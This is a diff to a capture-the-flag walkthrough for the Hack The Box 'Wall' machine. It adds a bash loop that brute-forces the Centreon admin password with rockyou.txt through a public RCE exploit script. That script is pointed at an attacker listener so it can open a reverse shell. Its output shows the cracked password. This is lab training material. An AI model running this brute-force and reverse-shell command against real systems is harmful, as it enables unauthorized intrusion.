@@ -96,9 +96,15 @@ Navigating to <b>http://10.10.10.157/centreon</b> we are greeted with a login pa
 
 Doing a quick google search will reveal a RCE exploit for this version of <b>centreon</b>.
 
-<center><img src="/htb/wall/exploit.png"></center>
+<center><img src="/htb/wall/rce.png"></center>
 <br>
-The problem with this exploit is that it requires user credentials to work so first I decided to combine a bash script with this python script to bruteforce the login credentials.
+The problem with this exploit is that it requires user credentials to work so first I decided to combine a bash script with this python script to bruteforce the login credentials. I used <b>admin</b> as the username.
+
+<b>Bash Script</b>
+```
+cat /usr/share/wordlists/rockyou.txt | while read line; do python3 47069.py http://10.10.10.157/centreon admin $line 10.10.14.21 10001;sleep 0.5; echo password=$line; done
+```
+After letting that run for a bit we see that it tells us the password is <b>password1</b>
 ```
 [+] Login token is : 2616bdbc1dddb74f1cbe25dd638be366                                                        
 [+] Logged In Sucssfully                                                                                     
@@ -116,3 +122,4 @@ ditional argument 'features="lxml"' to the BeautifulSoup constructor.
 [+] Check your netcat listener !                                                                             
 password=password1
 ```
+For some reason I couldn't get the RCE to work and open up a reverse shell for me so I had to find another way. I did this by logging into the <b>centreon</b> web app using the credentials we brute forced. I then navigated to <b>Configuration > Commands > Miscellaneous</b>
